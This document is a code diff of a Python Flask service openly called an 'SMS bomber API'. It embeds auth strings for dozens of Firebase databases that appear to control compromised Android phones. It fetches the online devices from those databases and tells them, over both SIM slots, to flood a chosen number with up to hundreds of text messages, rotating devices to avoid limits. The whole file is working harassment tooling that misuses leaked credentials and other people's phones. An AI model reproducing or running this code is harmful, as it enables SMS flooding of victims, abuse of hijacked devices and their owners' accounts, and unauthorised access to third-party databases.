@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
 """
 SMS BOMBER API - Render.com Deployment
-ONLINE DEVICES ONLY - DUAL SIM - 100 SMS LIMIT
-127+ Firebase Databases
+NO API KEY REQUIRED - Just number, msg, count
 Developer: @noobsater
 """
 
@@ -23,7 +22,6 @@ app = Flask(__name__)
 # ============================================================
 
 FIREBASE_CONFIGS = [
-    # ===== ASURPAPA wale =====
     {"name": "sex-panel", "url": "https://sex-panel-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
     {"name": "ritesh0001", "url": "https://ritesh0001-ea582-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
     {"name": "tika3", "url": "https://tika3-a400c-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
@@ -49,8 +47,6 @@ FIREBASE_CONFIGS = [
     {"name": "amirrr", "url": "https://amirrr-8a463-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
     {"name": "acchahi", "url": "https://acchahi-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
     {"name": "ankur", "url": "https://ankur-2511f-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
-    
-    # ===== Different Keys wale =====
     {"name": "ashu-415kumar", "url": "https://ashu-415kumar-default-rtdb.firebaseio.com", "auth": "1"},
     {"name": "adsf", "url": "https://adsf-8b4e8-default-rtdb.asia-southeast1.firebasedatabase.app", "auth": "1"},
     {"name": "surya", "url": "https://surya-917b9-default-rtdb.firebaseio.com", "auth": "Vo"},
@@ -76,8 +72,6 @@ FIREBASE_CONFIGS = [
     {"name": "jaduopop", "url": "https://jaduopop-a9a12-default-rtdb.firebaseio.com", "auth": "AIzaSyCfw-XX9NgbsUVCOP_GbxETXIY4AaH5b58"},
     {"name": "niggasionic", "url": "https://niggasionic-default-rtdb.asia-southeast1.firebasedatabase.app", "auth": "Hah"},
     {"name": "burchanno", "url": "https://burchanno-default-rtdb.asia-southeast1.firebasedatabase.app", "auth": "Pp"},
-    
-    # ===== URL = Key wale =====
     {"name": "hood", "url": "https://hood-4ba1e-default-rtdb.firebaseio.com", "auth": "https://hood-4ba1e-default-rtdb.firebaseio.com"},
     {"name": "lucifer", "url": "https://lucifer-spreader-default-rtdb.firebaseio.com", "auth": "https://lucifer-spreader-default-rtdb.firebaseio.com"},
     {"name": "totla-axis", "url": "https://totla-axis-default-rtdb.firebaseio.com", "auth": "https://totla-axis-default-rtdb.firebaseio.com"},
@@ -155,8 +149,6 @@ FIREBASE_CONFIGS = [
     {"name": "dusman", "url": "https://dusman-abf8b-default-rtdb.firebaseio.com", "auth": "https://dusman-abf8b-default-rtdb.firebaseio.com"},
     {"name": "riyy", "url": "https://riyy-e012e-default-rtdb.firebaseio.com", "auth": "https://riyy-e012e-default-rtdb.firebaseio.com"},
     {"name": "xkpz", "url": "https://xkpz-f937a-default-rtdb.firebaseio.com", "auth": "https://xkpz-f937a-default-rtdb.firebaseio.com"},
-    
-    # ===== Extra =====
     {"name": "oyilo", "url": "https://oyilo-5cada-default-rtdb.firebaseio.com", "auth": "https://oyilo-5cada-default-rtdb.firebaseio.com"},
     {"name": "rahul-fd65f", "url": "https://rahul-fd65f-default-rtdb.firebaseio.com", "auth": "V"},
     {"name": "admin-no-43", "url": "https://admin-no-43-default-rtdb.firebaseio.com", "auth": "V"},
@@ -192,25 +184,15 @@ def safe_int(value):
 def get_today():
     return datetime.now().strftime("%Y-%m-%d")
 
-def get_usage_key(device_id, sim):
-    return f"{device_id}_sim{sim}_{get_today()}"
-
 def can_send(device_id, sim):
-    key = get_usage_key(device_id, sim)
+    key = f"{device_id}_sim{sim}_{get_today()}"
     return device_usage.get(key, 0) < MAX_SMS_PER_SIM
 
 def increment_usage(device_id, sim):
-    key = get_usage_key(device_id, sim)
+    key = f"{device_id}_sim{sim}_{get_today()}"
     device_usage[key] = device_usage.get(key, 0) + 1
 
-def get_remaining(device_id, sim):
-    key = get_usage_key(device_id, sim)
-    return MAX_SMS_PER_SIM - device_usage.get(key, 0)
-
-# ============================================================
-
 def fetch_devices(config):
-    """Fetch ONLY online devices from Firebase"""
     url = f"{config['url']}/clients.json?auth={config['auth']}"
     try:
         response = requests.get(url, timeout=10)
@@ -221,7 +203,6 @@ def fetch_devices(config):
             return []
         devices = []
         for client_id, info in data.items():
-            # ONLINE CHECK
             is_online = info.get('status') == True or safe_int(info.get('battery')) > 0
             if is_online:
                 devices.append({
@@ -234,7 +215,6 @@ def fetch_devices(config):
         return []
 
 def fetch_all_devices():
-    """Fetch devices from all Firebase databases"""
     all_devices = []
     for config in FIREBASE_CONFIGS:
         devices = fetch_devices(config)
@@ -242,7 +222,6 @@ def fetch_all_devices():
     return all_devices
 
 def send_sms(config, client_id, to_number, message, sim=1):
-    """Send SMS using a device with specific SIM"""
     url = f"{config['url']}/clients/{client_id}/webhookEvent/sendSms.json?auth={config['auth']}"
     payload = {
         "sim": sim,
@@ -260,6 +239,8 @@ def send_sms(config, client_id, to_number, message, sim=1):
         return False
 
 # ============================================================
+# ===== ROUTES =====
+# ============================================================
 
 @app.route('/')
 def home():
@@ -275,10 +256,11 @@ def home():
 ║  📊 FEATURES:                                          ║
 ║                                                         ║
 ║  ✅ {len(FIREBASE_CONFIGS)} Firebase Databases           ║
-║  ✅ ONLY Online devices                                ║
+║  ✅ ONLINE devices only                                ║
 ║  ✅ Dual SIM (1 & 2)                                  ║
 ║  ✅ {MAX_SMS_PER_SIM} SMS per SIM per day              ║
 ║  ✅ Auto-rotate devices                                ║
+║  ✅ NO API KEY required                                ║
 ║                                                         ║
 ╠═══════════════════════════════════════════════════════════╣
 ║  👨‍💻 Developer: @noobsater                              ║
@@ -310,7 +292,7 @@ def send_sms_api():
     if not number or not message:
         return jsonify({"success": False, "error": "Number and message required!"}), 400
     
-    max_count = min(count, 10000)
+    max_count = min(count, 500)
     all_devices = fetch_all_devices()
     
     if not all_devices:
@@ -320,30 +302,21 @@ def send_sms_api():
             "firebases": len(FIREBASE_CONFIGS)
         }), 404
     
-    # Create tasks with rotation and dual SIM
     tasks = []
-    sims = [1, 2]  # Both SIM slots
-    
     for device in all_devices:
-        for sim in sims:
+        for sim in [1, 2]:
             if can_send(device['id'], sim):
-                tasks.append({
-                    "device": device,
-                    "sim": sim
-                })
+                tasks.append({"device": device, "sim": sim})
     
     if not tasks:
         return jsonify({
             "success": False,
             "error": "All SIMs exhausted! Limit: 100 per SIM per day",
             "limit": MAX_SMS_PER_SIM,
-            "total_devices": len(all_devices)
+            "total_online_devices": len(all_devices)
         }), 429
     
-    # Shuffle for rotation
     random.shuffle(tasks)
-    
-    # Limit to requested count
     tasks = tasks[:max_count]
     
     sent, failed = 0, 0
@@ -355,7 +328,7 @@ def send_sms_api():
         success = send_sms(device['config'], device['id'], number, message, sim)
         return success, sim
     
-    with ThreadPoolExecutor(max_workers=10) as ex:
+    with ThreadPoolExecutor(max_workers=5) as ex:
         for success, sim in ex.map(worker, tasks):
             if success:
                 sent += 1
@@ -369,7 +342,7 @@ def send_sms_api():
     return jsonify({
         "success": sent > 0,
         "target": number,
-        "message": message,
+        "message": message[:50] + ("..." if len(message) > 50 else ""),
         "requested": max_count,
         "sent": sent,
         "failed": failed,
@@ -378,18 +351,22 @@ def send_sms_api():
         "limit_per_sim": MAX_SMS_PER_SIM,
         "firebases": len(FIREBASE_CONFIGS),
         "developer": "@noobsater",
-        "channel": "t.me/noob11001"
+        "channel": "t.me/noob11001",
+        "channel2": "t.me/noobsterrr"
     })
 
 @app.route('/reset')
 def reset_api():
     global device_usage
     device_usage = {}
-    return jsonify({"success": True, "message": "Reset done!"})
+    return jsonify({
+        "success": True,
+        "message": "Device usage reset successfully!",
+        "developer": "@noobsater"
+    })
 
 @app.route('/debug')
 def debug_api():
-    """Debug endpoint - see raw devices"""
     all_devices = fetch_all_devices()
     return jsonify({
         "success": True,
